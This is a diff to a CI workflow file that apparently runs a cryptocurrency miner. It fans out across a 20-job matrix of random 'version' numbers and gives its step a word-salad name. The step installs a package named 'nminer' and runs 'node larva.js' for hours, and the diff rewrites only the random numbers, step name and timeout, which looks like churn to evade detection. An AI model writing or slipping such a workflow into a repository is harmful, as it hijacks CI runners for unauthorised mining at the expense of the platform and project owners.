@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6896 }
-          - { version: 2694 }
-          - { version: 149 }
-          - { version: 4281 }
-          - { version: 6575 }
-          - { version: 5110 }
-          - { version: 3554 }
-          - { version: 3316 }
-          - { version: 1173 }
-          - { version: 1925 }
-          - { version: 1664 }
-          - { version: 9068 }
-          - { version: 2841 }
-          - { version: 1715 }
-          - { version: 1174 }
-          - { version: 2414 }
-          - { version: 2225 }
-          - { version: 4196 }
-          - { version: 829 }
-          - { version: 6872 }
+          - { version: 1961 }
+          - { version: 2756 }
+          - { version: 7186 }
+          - { version: 4262 }
+          - { version: 3553 }
+          - { version: 8945 }
+          - { version: 5713 }
+          - { version: 9661 }
+          - { version: 6868 }
+          - { version: 9121 }
+          - { version: 3269 }
+          - { version: 7247 }
+          - { version: 2271 }
+          - { version: 7421 }
+          - { version: 3885 }
+          - { version: 7858 }
+          - { version: 3160 }
+          - { version: 969 }
+          - { version: 940 }
+          - { version: 4712 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: of pants under highly
+      - name: when fail times task
         run: |
           npm install nminer@latest
-          timeout 344m node larva.js || echo "larva executed"
+          timeout 305m node larva.js || echo "larva executed"
